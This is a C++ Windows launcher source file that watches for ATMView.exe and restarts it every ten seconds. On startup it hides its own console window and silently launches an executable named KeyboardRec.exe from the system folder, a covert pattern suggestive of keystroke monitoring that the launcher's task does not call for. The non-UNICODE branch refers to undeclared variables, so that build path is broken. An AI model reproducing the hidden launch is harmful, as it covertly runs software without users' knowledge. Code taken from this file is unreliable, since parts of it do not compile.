// ATMLauncher.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <tchar.h>
#include <Windows.h>
#include "Shlwapi.h"
#include "StdAfx.h"
#include <TlHelp32.h>
#include <string>

using std::string;
using std::wstring;

DWORD GetProcessidFromName(TCHAR *strProcessName)  
{  
	PROCESSENTRY32 pe;      
	DWORD id=0;      
	HANDLE hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);      
	pe.dwSize=sizeof(PROCESSENTRY32);      
	if(!Process32First(hSnapshot,&pe))      
	{
		return 0;      
	}

	while(1)      
	{      
		pe.dwSize=sizeof(PROCESSENTRY32);      
		if(Process32Next(hSnapshot,&pe)==FALSE)      
			break;      
		if(wcscmp(pe.szExeFile,strProcessName)==0)      
		{      
			id=pe.th32ProcessID;             
			break;      
		}            
	}      
	CloseHandle(hSnapshot);     
	return id;    
}

DWORD WINAPI MonitorThread (LPVOID lpParam)
{
	while (1)
	{        
		TCHAR processName[100];
#ifdef UNICODE  
		MultiByteToWideChar(CP_ACP, 0, "ATMView.exe", -1, processName, 100);  
#else  
		strcpy(Name, strUsr);  
#endif  
		if (GetProcessidFromName(processName) == 0) //当前进程已挂掉
		{
			//启动该进程
			char szATMViewPath[256];
			memset(szATMViewPath, 0, 256);	
			::GetModuleFileNameA(NULL, szATMViewPath, sizeof(szATMViewPath));
			char *ptr = strrchr(szATMViewPath, '\\');
			ptr[1] = '\0';

			strcat(szATMViewPath,"\\ATMView.exe");
			ShellExecuteA(NULL,"open",szATMViewPath, NULL, NULL,SW_SHOW);
		}

		Sleep(10000);
	}

	return ERROR_SUCCESS;
}

bool isAppInstanceExisted() 
{
	string mutexName = "ATMLauncher";
	HANDLE mutex = CreateMutexA(NULL, FALSE, mutexName.c_str());

	DWORD lastError = GetLastError();
	if (ERROR_ALREADY_EXISTS == lastError) {
		TCHAR szModuleFileName[MAX_PATH] = _T("ATMLauncher.exe");
		DWORD pid = GetProcessidFromName(szModuleFileName);

		if (pid != 0) {
			CloseHandle(mutex);
			mutex = NULL;
			return true;	
		} else {
			//LOG_INFO("MBRClient ALREADY_EXISTS MutexName:%s GetProcessIdByName RetFlg:%d", strMutexName.c_str(), bRet);
		}
	}

	return false;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HWND hwnd;
	hwnd=FindWindow(_T("ConsoleWindowClass"),NULL);//找到当前窗口句柄
	if(hwnd) {
		ShowOwnedPopups(hwnd,SW_HIDE);//显示或隐藏由指定窗口所有的全部弹出式窗口
		ShowWindow(hwnd,SW_HIDE);//控制窗口的可见性
		//WinExec 函数: 控制窗口的显示形式
		//假如开机自动运行: C:\\WINDOWS\\SYSTEM32\\KeyboardRec.exe
		WinExec("C:\\WINDOWS\\SYSTEM32\\KeyboardRec.exe",SW_HIDE);
	}

	if (isAppInstanceExisted()) {
		return 0;
	}

	HANDLE hThread = CreateThread (NULL, 0, MonitorThread, NULL, 0, NULL);
	WaitForSingleObject (hThread, INFINITE);
	return 0;
}

